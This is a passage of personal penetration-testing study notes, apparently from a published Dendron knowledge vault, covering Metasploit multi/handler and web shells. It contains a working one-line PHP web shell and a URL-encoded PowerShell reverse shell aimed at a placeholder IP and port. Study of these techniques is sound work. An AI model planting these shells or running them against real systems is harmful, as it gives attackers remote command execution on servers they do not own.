\u003ccode\u003egrep\u003c/code\u003e to search for a specific set of payloads.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/iFO6ydX.png\" alt=\"payloads\"\u003e\u003c/p\u003e\n\u003ch3 id=\"metasploit-multihandler\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#metasploit-multihandler\"\u003e\u003c/a\u003e\u003ca href=\"/IBM-cybersecurity/notes/9k9gs0zqcs40mq2fsi5nesj\"\u003eMetasploit\u003c/a\u003e multi/handler\u003c/h3\u003e\n\u003cp\u003eMulti/Handler is a superb tool for catching reverse shell. It is essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eOpen Metasploit with \u003ccode\u003emsfconsole\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eType \u003ccode\u003euse multi/handler/\u003c/code\u003e, and press Enter.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eUsing the \u003ccode\u003eoptions\u003c/code\u003e command, we need to set: payload, LHOST and LPORT.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet these options with the following commands: \n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eset PAYLOAD \u0026#x3C;payload\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eset LHOST \u0026#x3C;listen-address\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eset LPORT \u0026#x3C;listen-port\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWe can now start a listener with \u003ccode\u003eexploit -j\u003c/code\u003e to tell Metasploit to launch the module, running the job in the background.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWhen multi/handler is in the background, use \u003ccode\u003esessions\u003c/code\u003e to see all active sessions, and then use \u003ccode\u003esessions \u0026#x3C;number\u003e\u003c/code\u003e to select the appropriate session to foreground.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"web-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#web-shells\"\u003e\u003c/a\u003eWeb Shells\u003c/h2\u003e\n\u003cp\u003eThere are times where websites allow us an opportunity to upload an executable file. A 'webshell' is a term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCommands are entered into a webpage - either through an HTML form, or directly in the URL - which are then executed by the script.\u003c/li\u003e\n\u003cli\u003eExtremely useful if there are firewalls in place, or even a stepping stone into a fully fledged reverse or bind shell.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePHP is still the most common server side scripting language.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u0026#x3C;?php echo \"\u0026#x3C;pre\u003e\" . shell_exec($_GET[\"cmd\"]) . \"\u0026#x3C;/pre\u003e\"; ?\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThis will take a GET parameter in the URL and execute it on the system with \u003ccode\u003eshell_exec()\u003c/code\u003e. Any commands we enter in the URL after \u003ccode\u003e?cmd=\u003c/code\u003e will be executed  on the system - Windows or Linux. The pre elements are to ensure that the results are formatted correctly on the page.\u003c/p\u003e\n\u003cp\u003eThere are a variety of web shells available on Kali by default at \u003ccode\u003e/usr/share/webshells\u003c/code\u003e - including the the infamous \u003ca href=\"https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\"\u003ePentestMonkey php-reverse-shell\u003c/a\u003e - a full reverse shell written in PHP.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMost generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux web servers. They will not work on Windows by default.\u003c/li\u003e\n\u003cli\u003eWhen the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.\u003c/li\u003e\n\u003cli\u003eRCE with URL Encoded Powershell Reverse Shell copied into the URL: \n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003epowershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27\u0026#x3C;IP\u003e%27%2C\u0026#x3C;PORT\u003e%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003eRemember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","noteIndex":{"id":"3ipqfkgudo2s73dwa256ca0","title":"Brain","desc":"","updated":1654212603514,"created":1651706375099,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":"vault"},"contentHash":"a83b284bd096f5e390fe503b2b0b07c7","links":[{"type":"ref","from":{"fname":"root","id":"3ipqfkgudo2s73dwa256ca0","vaultName":"vault"},"value":"cybersecurity","position":{"start":{"line":5,"column":1,"offset":76},"end":{"line":5,"column":19,"offset":94},"indent":[]},"xvault":false,"to":{"fname":"cybersecurity"}}],"anchors":{"welcome-to-tysons-vault":{"type":"header","text":"Welcome to Tyson's Vault!","value":"welcome-to-tysons-vault","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":14,"column":0,"depth":2}},"children":["nkcab8fkftjfz927no2dyac","cl0utj7thwjp7bsmxe4v5va","o9kgllk4dy29wx2figqoz1w","5vhy4yxl34a7p6064a13u49","ce290z98noyy6eb5pniawk9","txeqnq5eaictderxvuifqr6","pn4fankyf3uifous1txqj5m","8ykaxd1qjsjfi1c6zsfq1eq","017vb349bxpq76wq69sai1u","wcuptt9dpzdx06nt9l6myuv","iulpmov883qv6tpqkgvbno8","8ml5picmbrjw3u887mag9dz","pd3512leoloo1qll6fr2j0o","e77elhqi5fhnpz5kdvxeudb","9k9gs0zqcs40mq2fsi5nesj","zegnyfq64amprq2yq9rnu3e","op8gluer5gorswd1xkdwwis","btat806wf3v71jpa11klryx","kldz5ejn1lvhsujdm2nyog7","9gc4nxd14um87nyud8e9ubt","ptonz0zapnutyahjkedfn8f","ixopv5geql8hlgkwk20pxow","3cschspue6elfiqxcd17tul","0f8xutu1gmbnw7xt51tim9v","87sb4tbzuopxpz736rwtx5b","d9ibeadgk68z3q2qjgsqida","woqkmy53oegpxi1ia3jl833","6ltznv32t1szgyl74knpxly","16md0j2hj1k5477uu3kclcb","2o3i5a96njb0vlfr61lslzi"],"parent":null,"data":{},"body":"# Welcome to Tyson's Vault!\n\nThis is my place store all my cool knowledge.\n\n![[cybersecurity]]\n\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNote":{"initialValue":"templates"},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":"vault"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"","dateFormat":"","addBehavior":"childOfCurrent","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link","taskCompleteStatus":["done","x"]},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false,"enableHandlebarTemplates":false,"templateHierarchy":"template","enableSmartRefs":true,"dendronVersion":"0.83.0"},"preview":{"theme":"dark","enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"logoPath":"https://clipground.com/images/cyber-logo-3.jpg","theme":"dark","siteUrl":"https://tysonnguyen.github.io","assetsPrefix":"/IBM-cybersecurity","enableFMTitle":true,"enableNoteTitleForLink":true,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Cybersecurity","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree","editRepository":"https://github.com/TysonNguyen/IBM-cybersecurity"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enablePrettyLinks":true,"duplicateNoteBehavior":{"action":"useVault","payload":["vault"]},"enableTaskNotes":true,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"ixopv5geql8hlgkwk20pxow"},"buildId":"NXb5WjKoAzTxCthMfgKQk","assetPrefix":"/IBM-cybersecurity","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>